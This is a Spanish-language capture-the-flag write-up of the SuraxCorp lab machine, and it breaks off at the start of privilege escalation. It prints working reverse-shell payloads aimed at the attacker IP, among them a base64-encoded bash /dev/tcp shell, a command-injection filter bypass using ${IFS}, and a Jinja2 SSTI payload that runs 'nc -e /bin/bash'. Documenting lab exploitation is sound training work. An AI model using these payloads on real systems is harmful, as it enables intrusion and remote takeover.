---
title: "TheHackersLabs: SuraxCorp"
date: 2026-09-16
draft: false
plataforma: "The Hackers Labs"
tags: ["ctf", "thehackerslabs", "ipv6", "rsync", "vhost", "command-injection", "ssti", "sudo-telnet", "privilege-escalation", "persistencia"]
categories: ["writeups"]
summary: "Recorrido completo de la máquina SuraxCorp de TheHackersLabs: descubrimiento de un vhost oculto vía IPv6 link-local y rsync anónimo, extracción de credenciales de un binario mediante análisis estático y de tráfico, inyección de comandos en un formulario de diagnóstico, pivoting interno hacia una aplicación Flask vulnerable a SSTI, y escalada final abusando de una regla sudo sobre telnet."
sistema: ["linux"]
dificultad: "profesional"
---

*Un recorrido completo de la máquina SuraxCorp, detallando el descubrimiento de un servicio rsync anónimo únicamente accesible por IPv6 link-local, la filtración de un vhost administrativo mediante sniffing de resoluciones DNS, la extracción de una credencial embebida en un binario compilado, la explotación de una inyección de comandos en un formulario de diagnóstico de red, el pivoting hacia una aplicación Flask interna vulnerable a Server-Side Template Injection (SSTI), y la escalada de privilegios final abusando de una regla `sudo` sobre `telnet`.*

**Publicado el 16 de septiembre de 2026 · Por Ne0t3k · 18 minutos de lectura**

SuraxCorp es, de las máquinas de TheHackersLabs documentadas hasta ahora en este portfolio, la que exige mayor variedad de técnicas encadenadas: descubrimiento de superficie por IPv6 cuando el escaneo IPv4 no revela todos los servicios, fuerza bruta de recursos rsync, extracción de un vhost oculto capturando tráfico DNS en lugar de mediante fuerza bruta de subdominios, ingeniería inversa ligera de un binario `.deb` para obtener una credencial válida, inyección de comandos en un campo de diagnóstico "ping", pivoting interno con un proxy TCP casero para alcanzar un servicio solo expuesto en `localhost`, y una cadena SSTI en Jinja2/Flask que culmina en RCE. El cierre de privilegios llega por una regla `sudo` sin restricciones sobre `telnet`, un binario con escape a shell documentado en GTFOBins.

IP objetivo: `10.0.2.6`. IP atacante: `10.0.2.3`. Las flags y las contraseñas de la máquina se muestran parcialmente censuradas para no facilitar la resolución directa a terceros; el objetivo de este artículo es documentar la metodología, no las respuestas.

## Reconocimiento — Descubrimiento de host

<pre class="term-log">
<span class="cmd">$ nmap -sP 10.0.2.0/24</span>
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-15 21:03 +0200
Nmap scan report for 10.0.2.1
Host is up (0.00042s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 10.0.2.2
Host is up (0.00030s latency).
MAC Address: 08:00:27:81:29:E7 (Oracle VirtualBox virtual NIC)
<span class="hl">Nmap scan report for 10.0.2.6</span>
<span class="hl">Host is up (0.00064s latency).</span>
<span class="hl">MAC Address: 08:00:27:A7:E0:95 (Oracle VirtualBox virtual NIC)</span>
Nmap scan report for 10.0.2.3
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 11.20 seconds
</pre>

Hosts activos: `10.0.2.3` (equipo atacante) y `10.0.2.6` (objetivo).

## Reconocimiento — Escaneo de puertos IPv4

<pre class="term-log">
<span class="cmd">$ nmap -A -sSV -p- --open -sCV --min-rate 5000 -n -Pn 10.0.2.6</span>
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-15 21:05 +0200
Nmap scan report for 10.0.2.6
Host is up (0.00065s latency).
Not shown: 64871 closed tcp ports (reset), 662 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
<span class="hl">22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)</span>
<span class="hl">80/tcp open  http    Apache httpd 2.4.67 ((Debian))</span>
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.67 (Debian)
MAC Address: 08:00:27:A7:E0:95 (Oracle VirtualBox virtual NIC)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.65 ms 10.0.2.6

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.10 seconds
</pre>

**Desglose de parámetros:**

- `-A`: detección de SO, versión de servicio, scripts NSE por defecto y traceroute.
- `-sSV`: escaneo SYN combinado con detección de versión.
- `-p- --open`: recorre los 65535 puertos TCP y muestra solo los abiertos.
- `-sCV`: fuerza además la ejecución de scripts de detección de versión (`-sC` + `-sV`) de forma redundante con `-A`, usado aquí por costumbre de plantilla de escaneo.
- `--min-rate 5000`: fuerza un ritmo mínimo de envío de paquetes.
- `-n -Pn`: sin resolución DNS inversa y sin descubrimiento de host previo.

Por IPv4 solo aparecen dos puertos abiertos: SSH (OpenSSH 10.0p2 sobre Debian 13/trixie) y HTTP (Apache 2.4.67 con la página por defecto de Debian, sin contenido propio). El intento de fingerprint de sistema operativo no obtiene coincidencia exacta y no aporta información aprovechable.

## Reconocimiento — Descubrimiento de servicios por IPv6

Con una superficie IPv4 tan reducida, se explora la conectividad IPv6 local del segmento, habitual en máquinas de laboratorio con más de una interfaz o protocolo expuesto:

<pre class="term-log">
<span class="cmd">$ ping6 -c 1 "ff02::1%eth0"</span>
PING ff02::1%eth0 (ff02::1%eth0) 56 data bytes
<span class="hl">64 bytes from fe80::b9f1:f637:ae7c:a54e%eth0: icmp_seq=1 ttl=64 time=0.032 ms</span>

--- ff02::1%eth0 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.032/0.032/0.032/0.000 ms
</pre>

**Desglose de parámetros:**

- `ping6 -c 1 "ff02::1%eth0"`: envía un único ping a la dirección multicast `ff02::1` (todos los nodos IPv6 del enlace local) sobre la interfaz `eth0`, provocando que cualquier host IPv6-activo en el segmento responda y revele su dirección link-local.

<pre class="term-log">
<span class="cmd">$ ip -6 neigh</span>
<span class="hl">fe80::6db7:9c02:4e5d:c3f8 dev eth0 lladdr 08:00:27:a7:e0:95 REACHABLE</span>
</pre>

La tabla de vecinos IPv6 confirma una dirección link-local (`fe80::6db7:9c02:4e5d:c3f8`) asociada a la misma MAC del objetivo (`08:00:27:a7:e0:95`), es decir, la misma máquina accesible también por IPv6.

<pre class="term-log">
<span class="cmd">$ nmap -6 -sS -p- --open --min-rate 5000 -n -Pn "fe80::6db7:9c02:4e5d:c3f8%eth0"</span>
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-15 21:09 +0200
Nmap scan report for fe80::6db7:9c02:4e5d:c3f8
Host is up (0.00031s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
<span class="hl">873/tcp open  rsync</span>
MAC Address: 08:00:27:A7:E0:95 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 7.95 seconds
</pre>

El escaneo sobre la dirección IPv6 revela un tercer puerto que no aparecía por IPv4: **873/tcp (rsync)**. Este es el hallazgo clave de la fase de reconocimiento — un servicio expuesto exclusivamente por una ruta de red distinta a la habitual.

## Explotación inicial — Enumeración de rsync

Con el servicio rsync localizado, se enumeran los recursos (`modules`) compartidos mediante fuerza bruta de nombres:

<pre class="term-log">
<span class="cmd">$ ./rsync-brute-real -t '[fe80::6db7:9c02:4e5d:c3f8%eth0]' -p 873 -w /usr/share/seclists/Discovery/Web-Content/common.txt</span>
────────────────────────────
 code: VulNyx™  ver: v1.0.0
────────────────────────────
 🎯 Target   | [fe80::6db7:9c02:4e5d:c3f8%eth0]:873
 📖 Wordlist | /usr/share/seclists/Discovery/Web-Content/common.txt
 🔎 Status   | 799/4749/16%/backup
 <span class="hl">💥 Resource | backup</span>
────────────────────────────
</pre>

La herramienta identifica un recurso rsync llamado `backup`. Se lista su contenido y se descarga:

<pre class="term-log">
<span class="cmd">$ rsync -av --list-only 'rsync://[fe80::6db7:9c02:4e5d:c3f8%eth0]/backup'</span>
receiving incremental file list
drwxrwxrwx          4.096 2026/06/29 14:50:06 .
<span class="hl">-rw-r--r--            497 2026/06/29 14:50:06 secure-suracorp.thl.conf</span>

sent 20 bytes  received 84 bytes  208,00 bytes/sec
total size is 497  speedup is 4,78
</pre>

<pre class="term-log">
<span class="cmd">$ rsync -avz 'rsync://[fe80::6db7:9c02:4e5d:c3f8%eth0]/backup/secure-suracorp.thl.conf' .</span>
receiving incremental file list
secure-suracorp.thl.conf

sent 43 bytes  received 367 bytes  820,00 bytes/sec
total size is 497  speedup is 1,21
</pre>

El recurso `backup` está configurado con permisos de lectura anónima (`rw-r--r--` sobre un directorio `rwxrwxrwx`) y expone un fichero de configuración de Apache:

<pre class="term-log">
<span class="cmd">$ cat secure-suracorp.thl.conf</span>
&lt;VirtualHost *:80&gt;
    ServerName secure-suraxcorp.thl
    ServerAlias wwww.secure-suraxcorp.thl
    ServerAdmin webmaster@secure-suraxcorp.thl
    DocumentRoot /var/www/secure-suracorp.thl/

    &lt;Directory /var/www/secure-suracorp.thl/&gt;
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    &lt;/Directory&gt;

    ErrorLog ${APACHE_LOG_DIR}/secure-suracorp.thl_error.log
    CustomLog ${APACHE_LOG_DIR}/secure-suracorp.thl_access.log combined
&lt;/VirtualHost&gt;
</pre>

El fichero filtra el `ServerName` de un virtual host que no era visible en el escaneo web inicial: `secure-suraxcorp.thl`.

## Explotación inicial — Portal SuraxCorp

Se registra el vhost localmente y se accede a él:

<pre class="term-log">
<span class="cmd">$ echo '10.0.2.6 secure-suraxcorp.thl' | sudo tee -a /etc/hosts</span>
10.0.2.6 secure-suraxcorp.thl
</pre>

<pre class="term-log">
<span class="cmd">$ curl -s -o - http://secure-suraxcorp.thl/ | head -50</span>
&lt;!DOCTYPE html&gt;
&lt;html lang="fr"&gt;
&lt;head&gt;
    &lt;title&gt;SuraxCorp&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div class="login-container"&gt;
    &lt;h2&gt;Portail SuraCorp&lt;/h2&gt;
    &lt;form method="POST" action=""&gt;
        &lt;div class="input-group"&gt;
            &lt;label for="username"&gt;Username&lt;/label&gt;
            &lt;input type="text" id="username" name="username" required&gt;
        &lt;/div&gt;
        &lt;div class="input-group"&gt;
            &lt;label for="password"&gt;Password&lt;/label&gt;
            &lt;input type="password" id="password" name="password" required&gt;
        &lt;/div&gt;
        &lt;button type="submit"&gt;Connexion&lt;/button&gt;
    &lt;/form&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</pre>

Un formulario de login estándar. Se prueba autenticación con un usuario común y sin contraseña, para verificar si el backend valida realmente la credencial:

<pre class="term-log">
<span class="cmd">$ curl -i -s -c cookies.txt -X POST -d "username=admin" http://secure-suraxcorp.thl/ | head -30</span>
HTTP/1.1 302 Found
Date: Tue, 15 Sep 2026 19:31:15 GMT
Server: Apache/2.4.67 (Debian)
Set-Cookie: PHPSESSID=3a079ccdbf97c83a18aa8471ff9c7d38; path=/
<span class="hl">Location: dashboard.php</span>
Content-Length: 0
Content-Type: text/html; charset=UTF-8
</pre>

El servidor redirige a `dashboard.php` con solo el campo `username`, sin validar contraseña — un fallo de autenticación que concede sesión válida a cualquier usuario indicado.

<pre class="term-log">
<span class="cmd">$ curl -s -b cookies.txt http://secure-suraxcorp.thl/dashboard.php > dashboard_full.html</span>
<span class="cmd">$ cat dashboard_full.html</span>
&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
    &lt;title&gt;SuraxCorp - Internal Dashboard&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;header&gt;
    &lt;h1&gt;SuraCorp Portal&lt;/h1&gt;
    &lt;div class="user-info"&gt;
        Logged in as: &lt;strong&gt;SuraCorp_Director&lt;/strong&gt;
        &lt;a href="logout.php" class="logout-btn"&gt;Logout&lt;/a&gt;
    &lt;/div&gt;
&lt;/header&gt;

&lt;div class="container"&gt;

    &lt;!-- SuraCorp About Section --&gt;
    &lt;section class="about-section"&gt;
        &lt;h2&gt;About SuraxCorp&lt;/h2&gt;
        &lt;p&gt;
            Founded at the dawn of corporate digital transformation, &lt;strong&gt;SuraCorp&lt;/strong&gt; stands as a global leader in technological innovation and infrastructure data centralization. We engineer high-performance enterprise software solutions tailored for the most demanding sectors, ranging from critical network administration to medical bioinformatics.
        &lt;/p&gt;
    &lt;/section&gt;

    &lt;!-- SuraPharm Promotion Section --&gt;
    &lt;section class="product-card"&gt;
        &lt;h2&gt;SuraPharm &lt;span class="badge"&gt;v2.4.1 - Stable&lt;/span&gt;&lt;/h2&gt;
        &lt;p&gt;
            Discover &lt;strong&gt;SuraPharm&lt;/strong&gt;, our state-of-the-art software solution dedicated to the integrated management of pharmacies and pharmaceutical inventories.
        &lt;/p&gt;

        &lt;div class="download-zone"&gt;
            &lt;a href="downloads/surapharm.deb" class="download-btn"&gt;
                &lt;span&gt;Download for Linux&lt;/span&gt;
                &lt;small&gt;Format: .deb (Debian/Ubuntu/Kali) | 42.1 MB&lt;/small&gt;
            &lt;/a&gt;
            &lt;a href="downloads/surapharm.exe" class="download-btn"&gt;
                &lt;span&gt;Download for Windows&lt;/span&gt;
                &lt;small&gt;Format: .exe (Standalone Installer) | 68.4 MB&lt;/small&gt;
            &lt;/a&gt;
        &lt;/div&gt;
    &lt;/section&gt;

&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</pre>

El dashboard promociona una descarga del software interno **SuraPharm**, disponible como paquete `.deb` para Linux.

## Explotación — Ingeniería inversa del paquete SuraPharm

Se descarga y analiza el paquete Debian:

<pre class="term-log">
<span class="cmd">$ curl -s -b cookies.txt -O http://secure-suraxcorp.thl/downloads/surapharm.deb</span>
<span class="cmd">$ file surapharm.deb</span>
<span class="hl">surapharm.deb: Debian binary package (format 2.0), with control.tar.xz, data compression xz</span>
</pre>

<pre class="term-log">
<span class="cmd">$ 7z e surapharm.deb</span>
Path = surapharm.deb
Type = Ar
Physical Size = 7816
SubType = deb
----
Path = data.tar.xz
Size = 6528
Everything is Ok
</pre>

<pre class="term-log">
<span class="cmd">$ tar -xf data.tar</span>
<span class="cmd">$ find . -name surapharm -type f 2>/dev/null</span>
<span class="hl">./usr/bin/surapharm</span>
</pre>

Con el binario extraído, se buscan cadenas de texto relevantes:

<pre class="term-log">
<span class="cmd">$ strings usr/bin/surapharm | grep -iE "pass|admin|http|suraxcorp|pharm|user"</span>
pharmacist
[0;36mUsername >
[0;36mPassword >
Syncing admin portal
  Publisher : SuraxCorp
admin
Head Pharmacist
i.martin@surapharm.thl
Pharmacy Tech
t.renard@surapharm.thl
Administrator
c.dubois@surapharm.thl
a.lefevre@surapharm.thl
System Admin
admin@suraxcorp.thl
[2m  Surapharm GMP v2.3.1  |  User: pharmacist  |  %s
GET / HTTP/1.1
User-Agent: SurapharmGMP/2.3.1 (Linux x86_64)
<span class="hl">adminis-</span>
</pre>

Entre los resultados aparece el fragmento `adminis-`, indicio de un subdominio administrativo truncado por el propio grep. Se busca además una posible contraseña embebida con un patrón de complejidad típico:

<pre class="term-log">
<span class="cmd">$ strings usr/bin/surapharm > all_strings.txt</span>
<span class="cmd">$ grep -nE '[A-Za-z]+[0-9]+[!@#$%^&*]+' all_strings.txt</span>
<span class="hl">110:Suraph@rm...m2024!</span>
</pre>

Se localiza una contraseña embebida en texto plano dentro del binario.

## Explotación — Sniffing del vhost administrativo

El binario simula un cliente que se sincroniza contra un portal admin. Para descubrir el nombre real del vhost (en lugar de intentar fuerza bruta de subdominios), se captura el tráfico generado por el propio binario al ejecutarlo:

<pre class="term-log">
Terminal 1
<span class="cmd">$ sudo tcpdump -i eth0 -A -n | grep -i "suraxcorp\|surapharm\|GET"</span>
[sudo] contraseña para kali:
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
</pre>

<pre class="term-log">
Terminal 2
<span class="cmd">$ ./usr/bin/surapharm</span>
  Pharmaceutical Management System — SuraxCorp (c) 2024

  ─────────────────────────────────────────────────────────────────────────
  |                             AUTHENTICATION                             |
  ─────────────────────────────────────────────────────────────────────────
  Surapharm GMP v2.3.1  |  User: pharmacist  |  2026-09-15  21:49:57

  Please log in with your Surapharm credentials.

  Username > pharmacist
  Password >

  ✔ Login successful. Welcome, pharmacist.
  ✔ Loading system [████████████████████████] 100%

  ─────────────────────────────────────────────────────────────────────────
  |                               MAIN MENU                                |
  ─────────────────────────────────────────────────────────────────────────

    [1]  ->  Dashboard
    [2]  ->  Medication inventory
    [3]  ->  Supplier orders
    [4]  ->  Staff management
    [5]  ->  About
    [0]  x   Quit
</pre>

Al navegar a la primera opción (Dashboard) el binario genera una petición de red que queda capturada en la terminal del `tcpdump`:

<pre class="term-log">
Terminal 1
21:50:48.904044 IP 10.0.2.3.57957 &gt; 192.168.0.1.53: 14405+ A? adminis-surapharm.suraxcorp.thl. (49)
........e.5.9..8E...........adminis-surapharm   suraxcorp.thl.....
</pre>

La captura DNS revela el FQDN completo del panel administrativo: <span class="hl">`adminis-surapharm.suraxcorp.thl`</span>.

<pre class="term-log">
<span class="cmd">$ echo '10.0.2.6 adminis-surapharm.suraxcorp.thl' | sudo tee -a /etc/hosts</span>
10.0.2.6 adminis-surapharm.suraxcorp.thl
</pre>

## Explotación — Acceso al panel Surapharm

<pre class="term-log">
<span class="cmd">$ curl -s -o - http://adminis-surapharm.suraxcorp.thl/ | head -50</span>
&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
&lt;title&gt;Surapharm — Admin Portal&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
...
</pre>

Con la credencial extraída del binario (`pharmacist` / `Suraph@rm...m2024!`), se accede al panel:

<pre class="term-log">
<span class="cmd">$ curl -i -s -c cookies2.txt -X POST -d 'username=pharmacist&amp;password=Suraph@rm...m2024!' http://adminis-surapharm.suraxcorp.thl/</span>
HTTP/1.1 302 Found
Date: Tue, 15 Sep 2026 19:57:19 GMT
Server: Apache/2.4.67 (Debian)
Set-Cookie: PHPSESSID=3087d2257a50a9bf1cbb905bd371423c; path=/
<span class="hl">Location: /</span>
Content-Length: 0
Content-Type: text/html; charset=UTF-8
</pre>

Autenticación correcta. Se descarga el panel autenticado en busca de funcionalidad interesante:

<pre class="term-log">
<span class="cmd">$ curl -s -b cookies2.txt http://adminis-surapharm.suraxcorp.thl/ > dashboard2.html</span>
<span class="cmd">$ grep -B 5 'name="host"' dashboard2.html</span>
      &lt;div class="card-head"&gt;&#128246; Network Diagnostics&lt;/div&gt;
      &lt;div class="card-body"&gt;
        &lt;form method="POST"&gt;
          &lt;label&gt;Ping a host or IP address&lt;/label&gt;
          &lt;div class="diag-form"&gt;
            &lt;input type="text" name="host"
</pre>

El panel incluye un formulario de "Network Diagnostics" que ejecuta un `ping` contra el host indicado — un candidato claro a inyección de comandos del lado del servidor.

## Explotación — Inyección de comandos en el diagnóstico de red

Prueba de control básico:

<pre class="term-log">
<span class="cmd">$ curl -s -b cookies2.txt -X POST -d 'host=10.0.2.3' http://adminis-surapharm.suraxcorp.thl/ | grep -A 3 "diag-output"</span>
                &lt;div class="diag-output"&gt;PING 10.0.2.3 (10.0.2.3) 56(84) bytes of data.
64 bytes from 10.0.2.3: icmp_seq=1 ttl=64 time=0.511 ms
64 bytes from 10.0.2.3: icmp_seq=2 ttl=64 time=0.566 ms
</pre>

El campo `host` se pasa directamente a un comando `ping` del sistema. Un intento directo con metacaracter `|` no produce salida visible:

<pre class="term-log">
<span class="cmd">$ curl -s -b cookies2.txt -X POST -d 'host=10.0.2.3|id' http://adminis-surapharm.suraxcorp.thl/ | grep -A 5 "diag-output"</span>
                &lt;div class="diag-output"&gt;No output. Enter a host above and click Run.&lt;/div&gt;
</pre>

El backend probablemente filtra o valida el formato de IP antes de concatenar, bloqueando el intento simple. Se rodea el filtro codificando el payload en base64 y separando los comandos mediante `${IFS}` (evita espacios literales, un carácter frecuentemente bloqueado en validaciones ingenuas):

<pre class="term-log">
<span class="cmd">$ echo 'bash -i >&amp; /dev/tcp/10.0.2.3/4444 0>&amp;1' | base64 -w0</span>
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuMy80NDQ0IDA+JjEK
</pre>

<pre class="term-log">
Terminal 2
<span class="cmd">$ nc -lvnp 4444</span>
listening on [any] 4444 ...
</pre>

<pre class="term-log">
Terminal 1
<span class="cmd">$ curl -s -b cookies2.txt -X POST --data-urlencode 'host=10.0.2.3|e\cho${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuMy80NDQ0IDA+JjEK|b\ase64${IFS}-d|b\ash' http://adminis-surapharm.suraxcorp.thl/ | grep -A 5 "diag-output"</span>
</pre>

**Desglose de la técnica:**

- El payload divide las palabras clave sensibles a filtros (`echo`, `base64`, `bash`) insertando barras invertidas (`e\cho`) que bash interpreta como continuación literal del mismo comando, evadiendo comparaciones de cadena exactas en el backend.
- `${IFS}` sustituye al espacio, ya que muchos filtros de inyección de comandos bloquean el carácter espacio pero no la variable de separador de campos interno de bash.
- El comando decodifica el base64 (la reverse shell) y lo canaliza directamente a `bash` mediante tuberías.

<pre class="term-log">
Terminal 2
<span class="hl-green">connect to [10.0.2.3] from (UNKNOWN) [10.0.2.6] 50522</span>
bash: cannot set terminal process group (899): Inappropriate ioctl for device
bash: no job control in this shell
www-data@TheHackersLabs-SuraxCorp:/var/www/adminis-surapharm$ id &amp;&amp; whoami
<span class="hl">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
www-data
</pre>

Shell obtenida como `www-data`.

### Tratamiento de la shell (TTY upgrade)

<pre class="term-log">
<span class="cmd">$ which python3</span>
/usr/bin/python3
<span class="cmd">$ python3 -c 'import pty; pty.spawn("/bin/bash")'</span>
<span class="cmd"># Ctrl+Z</span>
<span class="cmd">$ stty raw -echo; fg</span>
<span class="cmd">$ export TERM=xterm-256color</span>
<span class="cmd">$ export SHELL=bash</span>
<span class="cmd">$ stty rows $(tput lines) columns $(tput cols)</span>
</pre>

## Movimiento lateral — Pivoting hacia el servicio interno

Con shell estable, se enumeran procesos y puertos en escucha:

<pre class="term-log">
<span class="cmd">$ ps -faux</span>
...
suraxddq     857  0.0  0.8  42684 34796 ?        Ss   20:01   0:00 /usr/bin/pyth
<span class="hl">suraxddq     910  7.5  0.9 119328 37772 ?        Sl   20:01   5:07  \_ /usr/bin/</span>
...
</pre>

<pre class="term-log">
<span class="cmd">$ cat /proc/910/cmdline | tr '\0' ' '; echo</span>
<span class="hl">/usr/bin/python3 /home/suraxddq/ssti/app.py</span>
</pre>

<pre class="term-log">
<span class="cmd">$ ss -nltp</span>
State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port  Process
LISTEN   0        4096           127.0.0.1:631           0.0.0.0:*
<span class="hl">LISTEN   0        128            127.0.0.1:5000          0.0.0.0:*</span>
LISTEN   0        128              0.0.0.0:22            0.0.0.0:*
LISTEN   0        5                   [::]:873              [::]:*
LISTEN   0        128                 [::]:22               [::]:*
LISTEN   0        511                    *:80                  *:*
LISTEN   0        4096               [::1]:631              [::]:*
</pre>

El proceso `910`, propiedad del usuario `suraxddq`, corresponde a una aplicación Python (`app.py`, ruta `ssti/`) escuchando únicamente en `127.0.0.1:5000` — inaccesible directamente desde el exterior. Se construye un proxy TCP en Python para redirigir el tráfico externo hacia ese puerto local:

<pre class="term-log">
<span class="cmd">$ nano /tmp/proxy.py</span>
<span class="cmd">$ cat /tmp/proxy.py</span>
import socket, threading

def forward(src, dst):
    try:
        while True:
            data = src.recv(4096)
            if not data:
                break
            dst.sendall(data)
    except:
        pass
    finally:
        src.close()
        dst.close()

def handle(client):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.connect(("127.0.0.1", 5000))
        threading.Thread(target=forward, args=(client, server), daemon=True).start()
        threading.Thread(target=forward, args=(server, client), daemon=True).start()
    except Exception as e:
        client.close()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 4000))
s.listen(5)
while True:
    client, addr = s.accept()
    threading.Thread(target=handle, args=(client,), daemon=True).start()
</pre>

<pre class="term-log">
<span class="cmd">$ nohup python3 /tmp/.proxy.py > /dev/null 2>&amp;1 &amp;</span>
[1] 2430
<span class="cmd">$ disown</span>
</pre>

**Desglose de la técnica:**

- El script abre un socket en `0.0.0.0:4000` y, por cada conexión entrante, abre una segunda conexión hacia `127.0.0.1:5000`, reenviando bytes en ambas direcciones mediante dos hilos (`forward`).
- `nohup ... &` desvincula el proceso de la señal de cierre de la sesión y `disown` lo retira de la tabla de trabajos del shell, permitiendo que el proxy siga activo aunque la shell reversa se caiga o se cierre.

Desde la máquina atacante, el puerto 5000 interno ya es accesible a través del proxy en el puerto 4000:

<pre class="term-log">
<span class="cmd">$ curl -s http://10.0.2.6:4000/ | head -30</span>
&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
    &lt;title&gt;Create Event&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;header&gt;
        &lt;h1&gt;✨ Plan Your Event&lt;/h1&gt;
        &lt;form action="/surax" method="POST"&gt;
            &lt;button type="submit" class="toggle-btn"&gt;
                Suraxcorp Event
            &lt;/button&gt;
        &lt;/form&gt;
    &lt;/header&gt;
    &lt;div class="container"&gt;
&lt;h2&gt;Create a New Event&lt;/h2&gt;
&lt;form method="POST" action="/event"&gt;
    &lt;label&gt;Event Name:&lt;/label&gt;
    &lt;input type="text" name="event_name" required&gt;
    &lt;label&gt;Date:&lt;/label&gt;
    &lt;input type="date" name="date" required&gt;
    &lt;label&gt;Location:&lt;/label&gt;
    &lt;input type="text" name="location" required&gt;
    &lt;label&gt;Description about Event:&lt;/label&gt;
    &lt;textarea name="description" rows="4"&gt;&lt;/textarea&gt;
    &lt;button type="submit"&gt;Create Event&lt;/button&gt;
&lt;/form&gt;
    &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</pre>

Una aplicación de creación de eventos con un botón "Suraxcorp Event" que apunta a `/surax`.

## Explotación — SSTI en la aplicación Flask interna

<pre class="term-log">
<span class="cmd">$ curl -s -X POST http://10.0.2.6:4000/surax -c ssti_cookies.txt -b ssti_cookies.txt</span>
<span class="cmd">$ curl -s http://10.0.2.6:4000/ -b ssti_cookies.txt | grep -i "toggle-btn\|Disable\|Enable"</span>
            &lt;button type="submit" class="toggle-btn"&gt;
                🛡️ <span class="hl">Disable SSTI</span>
</pre>

El botón `/surax` activa explícitamente un modo "SSTI" en la aplicación — una funcionalidad de laboratorio deliberadamente vulnerable a Server-Side Template Injection. Se confirma con el payload clásico de detección de Jinja2:

<pre class="term-log">
<span class="cmd">$ curl -s -b ssti_cookies.txt -X POST --data-urlencode 'event_name=Test' --data-urlencode 'date=2026-09-15' --data-urlencode 'location=Madrid' --data-urlencode 'description={{7*7}}' http://10.0.2.6:4000/event</span>
&lt;h2&gt;🎈 Event Details&lt;/h2&gt;
&lt;div class="details"&gt;
    &lt;p&gt;&lt;strong&gt;Event Name:&lt;/strong&gt; Test&lt;/p&gt;
    &lt;p&gt;&lt;strong&gt;Date:&lt;/strong&gt; 2026-09-15&lt;/p&gt;
    &lt;p&gt;&lt;strong&gt;Location:&lt;/strong&gt; Madrid&lt;/p&gt;
    &lt;p&gt;&lt;strong&gt;Description:&lt;/strong&gt; <span class="hl">49</span>&lt;/p&gt;
&lt;/div&gt;
</pre>

El campo `description` devuelve `49` en lugar de `{{7*7}}` literal: el motor de plantillas Jinja2 está evaluando la expresión como código, confirmando el SSTI.

### De SSTI a RCE

<pre class="term-log">
<span class="cmd">$ nc -nlvp 5555</span>
listening on [any] 5555 ...
</pre>

<pre class="term-log">
<span class="cmd">$ curl -s -b ssti_cookies.txt -X POST --data-urlencode 'event_name=Test' --data-urlencode 'date=2026-09-15' --data-urlencode 'location=Madrid' --data-urlencode "description={{ self.__init__.__globals__.__builtins__.__import__('os').popen('nc 10.0.2.3 5555 -e /bin/bash').read() }}" http://10.0.2.6:4000/event</span>
</pre>

**Desglose de la técnica:**

- `self.__init__.__globals__`: rompe el sandbox del motor de plantillas accediendo al espacio de nombres globales de Python desde el propio objeto de la plantilla.
- `__builtins__.__import__('os')`: importa el módulo `os` sin necesidad de que esté expuesto explícitamente al contexto de la plantilla.
- `os.popen(...).read()`: ejecuta el comando del sistema y devuelve su salida, en este caso una reverse shell hacia el puerto 5555 de la máquina atacante.

<pre class="term-log">
<span class="hl-green">connect to [10.0.2.3] from (UNKNOWN) [10.0.2.6] 53002</span>
<span class="cmd">$ id &amp;&amp; whoami</span>
<span class="hl">uid=1000(suraxddq) gid=1000(suraxddq) groups=1000(suraxddq),100(users)</span>
suraxddq
</pre>

Shell obtenida directamente como `suraxddq`, el propietario del proceso Flask — sin necesidad de un salto de usuario adicional, ya que el SSTI se ejecuta con los privilegios del proceso que interpreta la plantilla.

### Tratamiento de la shell y flag de usuario

<pre class="term-log">
<span class="cmd">$ python3 -c 'import pty; pty.spawn("/bin/bash")'</span>
<span class="cmd"># Ctrl+Z</span>
<span class="cmd">$ stty raw -echo; fg</span>
<span class="cmd">$ export TERM=xterm-256color</span>
<span class="cmd">$ export SHELL=bash</span>
<span class="cmd">$ stty rows $(tput lines) columns $(tput cols)</span>
<span class="cmd">$ cat ~/user.txt</span>
<span class="hl-green">THL{424a260...f03c8ec}</span>
</pre>

## Escalada de privilegios — suraxddq → root

<pre class="term-log">
<span class="cmd">$ sudo -l</span>
Matching Defaults entries for suraxddq on TheHackersLabs-SuraxCorp:
    env_reset, mail_badpass,
